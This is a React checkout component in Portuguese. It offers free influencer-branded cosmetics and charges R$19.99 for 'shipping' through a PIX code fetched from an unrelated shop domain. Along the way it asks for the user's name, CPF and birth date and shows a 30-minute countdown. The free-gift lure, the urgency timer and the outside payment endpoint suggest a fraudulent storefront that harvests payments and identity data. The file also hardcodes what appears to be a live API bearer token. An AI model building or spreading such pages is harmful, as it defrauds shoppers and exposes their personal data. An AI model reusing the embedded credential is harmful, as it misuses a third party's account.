import { useState,useRef } from 'react';
import './pag7.css';
import { QRCodeSVG } from 'qrcode.react';

const produtos = [
  {
    nome: 'KIT FRAN GLOSSLICIOUS BY FRANCINY EHLKE',
    imagem: 'https://cdn.iset.io/assets/70914/produtos/199/medida-ecomm-fran-kit-glosslicious-prancheta-1-01.jpg',
  },
  {
    nome: 'GLOSS FRAN BY FRANCINY EHLKE LIPHONEY',
    imagem: 'https://cdn.iset.io/assets/70914/produtos/204/lip-honey-fran-by-fr-01.jpg',
  },
  {
    nome: 'Base Mate Real Filter 30g - FRANCINY EHLKE',
    imagem: 'https://cdn.awsli.com.br/2500x2500/2569/2569686/produto/216476854/1994-base-mate-real-filter-fran-by-franciny-ehlke-1644374997-bjxjfqp62o.jpg',
  },
  {
    nome: 'Kit Fran #CHILLIKIT - FRANCINY EHLKE',
    imagem: 'https://cdn.awsli.com.br/2500x2500/2569/2569686/produto/258822625/chilliki-1-9qbtlprqd6.png',
  },
  {
    nome: 'Balm Scrub Stick Bamboo - FRANCINY EHLKE',
    imagem: 'https://cdn.awsli.com.br/2500x2500/2569/2569686/produto/241602033/anyconv-com__7898969501903-0-dlvskuztx0.jpg',
  },
  {
    nome: 'Paleta Iluminadores Fran Gritani - FRANCINY EHLKE',
    imagem: 'https://cdn.awsli.com.br/2500x2500/2569/2569686/produto/258824982/paleta-iluminadores-fran-gritani---franciny-ehlke-1-v5nn2ilt6y.png',
  }
];

export default function Pag8() {
  const [selecionados, setSelecionados] = useState([]);
  const [cep, setCep] = useState('');
  const [frete, setFrete] = useState(null);
  const [endereco, setEndereco] = useState(null);
  const [copied, setCopied] = useState(false);
  const [erroCep, setErroCep] = useState(false);
  const resultadoRef = useRef(null);
  const toggleProduto = (nome) => {
    if (selecionados.includes(nome)) {
      setSelecionados(selecionados.filter(p => p !== nome));
    } else if (selecionados.length < 2) {
      setSelecionados([...selecionados, nome]);
    }
  };

  const consultarCep = async () => {
    if (cep.length !== 8) {
      setErroCep(true);
      return;
    }
  
    try {
      const response = await fetch(`https://api.brasilaberto.com/v1/zipcode/${cep}`, {
        headers: {
          Authorization: `Bearer 9JTM5y6W26pfNhFCVH2tj9NP5aGRRM65L7r0t0ApYfJRLORVV5sKijdF9lPCi6Lu`
        }
      });
  
      if (!response.ok) {
        // Aqui captura 404 ou qualquer outro erro HTTP
        setErroCep(true);
        return;
      }
  
      const json = await response.json();
  
      if (!json.result || json.error) {
        setErroCep(true);
        return;
      }
  
      setEndereco(json.result);
      setFrete(19.99);
  
      setTimeout(() => {
        if (resultadoRef.current) {
          resultadoRef.current.scrollIntoView({ behavior: 'smooth', block: 'start' });
        }
      }, 300);
  
    } catch (error) {
      console.error("Erro ao buscar o CEP:", error);
      setErroCep(true);
    }
  };

  const [showModal, setShowModal] = useState(false);
  const [pixData, setPixData] = useState(null);
  const [pagando, setPagando] = useState(false);
  const [form, setForm] = useState({ nome: '', cpf: '', nascimento: '' });
  const [timer, setTimer] = useState(30 * 60); // 30 minutos em segundos
  
  const gerarPix = async () => {
    setPagando(true);
    try {
      const response = await fetch("https://trucdegenie.shop/5/api.php?valor=19.99");
      const data = await response.json();
      if (data.status) {
        setPixData(data);
        iniciarTimer();
      } else {
        alert('Erro ao gerar PIX!');
      }
    } catch (e) {
      alert('Erro na API');
    }
    setPagando(false);
  };
  const formatarCpf = (cpf) => {
    return cpf
      .replace(/\D/g, '') // remove tudo que não é número
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
  };
  
  const formatarData = (val) => {
    return val
      .replace(/\D/g, '')
      .replace(/(\d{2})(\d)/, '$1/$2')
      .replace(/(\d{2})(\d)/, '$1/$2')
      .replace(/(\/\d{4})\d+?$/, '$1');
  };
  
  const iniciarTimer = () => {
    const intervalo = setInterval(() => {
      setTimer((t) => {
        if (t <= 1) {
          clearInterval(intervalo);
          return 0;
        }
        return t - 1;
      });
    }, 1000);
  };
  
  const formatarTempo = (seg) => {
    const min = String(Math.floor(seg / 60)).padStart(2, '0');
    const s = String(seg % 60).padStart(2, '0');
    return `${min}:${s}`;
  };
  return (
    <div className="pag8">
      <h2>Escolha até 2 produtos para receber de presente 🎁</h2>

      <div className="grid-produtos">
        {produtos.map((p, i) => (
          <div
            key={i}
            className={`produto-card ${selecionados.includes(p.nome) ? 'selecionado' : ''}`}
            onClick={() => toggleProduto(p.nome)}
          >
            <img src={p.imagem} alt={p.nome} />
            <p>{p.nome}</p>
          </div>
        ))}
      </div>

      <h3>Endereço de entrega</h3>
      <input
        type="text"
        placeholder="Digite seu CEP"
        value={cep}
        onChange={(e) => setCep(e.target.value.replace(/\D/g, ''))}
        maxLength="8"
      />
      <button className="btn" onClick={consultarCep}>Calcular Frete</button>

      <div className={`endereco-wrapper ${endereco ? 'mostrar' : ''}`}>
  {endereco && (
    <div className="endereco">
      <p><strong>Rua:</strong> {endereco.street}</p>
      <p><strong>Bairro:</strong> {endereco.district}</p>
      <p><strong>Cidade:</strong> {endereco.city} - {endereco.state}</p>
    </div>
  )}
<div ref={resultadoRef}>

  {frete !== null && (
    <div className="resumo">
      <p><strong>Produtos:</strong> Grátis</p>
      <p><strong>Frete SEDEX:</strong> R$ 19,99</p>
      <p><strong>Total:</strong> R$ 19,99</p>
      <button className="btn finalizar" onClick={() => {
  setShowModal(true);
  setTimeout(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, 300);
}}>Finalizar Pedido</button>
    </div>
  )}
  </div>
</div>
{showModal && (
  <div
    className="modal-overlay"
    style={{ zIndex: 9999 }}
    onClick={() => !pagando && setShowModal(false)}
  >
    <div className="modal" onClick={(e) => e.stopPropagation()}>

      {!pixData && (
        <>
          <h3>Complete seu cadastro</h3>

          <input type="text" placeholder="Nome completo" value={form.nome}
            onChange={(e) => setForm({ ...form, nome: e.target.value })}
          />
          <input type="text" placeholder="CPF" value={form.cpf}
            onChange={(e) => setForm({ ...form, cpf: formatarCpf(e.target.value) })}
            maxLength={14}
          />
          <input type="text" placeholder="Data de nascimento (DD/MM/AAAA)" value={form.nascimento}
            onChange={(e) => setForm({ ...form, nascimento: formatarData(e.target.value) })}
            maxLength={10}
          />

          <button className="btn gerar" onClick={gerarPix} disabled={pagando}>
            {pagando ? <span className="loader"></span> : "Gerar PIX"}
          </button>
        </>
      )}

      {pixData && (
        <div className="pix-gerado">
          <h4>Pagamento do frete via PIX</h4>


          <QRCodeSVG value={pixData.pixcode} size={180} />
          <p className="codigo">{pixData.pixcode}</p>

          <button
            className="copiar-btn"
            onClick={() => {
              navigator.clipboard.writeText(pixData.pixcode);
              setCopied(true);
              setTimeout(() => setCopied(false), 2000);
            }}
          >
            {copied ? "Código copiado!" : "Copiar código PIX"}
          </button>

          <p style={{ fontSize: '13px', color: '#444', marginTop: '10px' }}>
            Após o pagamento, você receberá uma notificação com o código de rastreio dos Correios.
          </p>
        </div>
      )}
    </div>
  </div>
)}
{erroCep && (
  <div className="modal-overlay" onClick={() => setErroCep(false)}>
    <div className="modal" onClick={(e) => e.stopPropagation()}>
      <h3>CEP inválido</h3>
      <p>Verifique se digitou corretamente os 8 números do seu CEP.</p>
      <button className="btn" onClick={() => setErroCep(false)}>Fechar</button>
    </div>
  </div>
)}


    </div>
    
  );
}
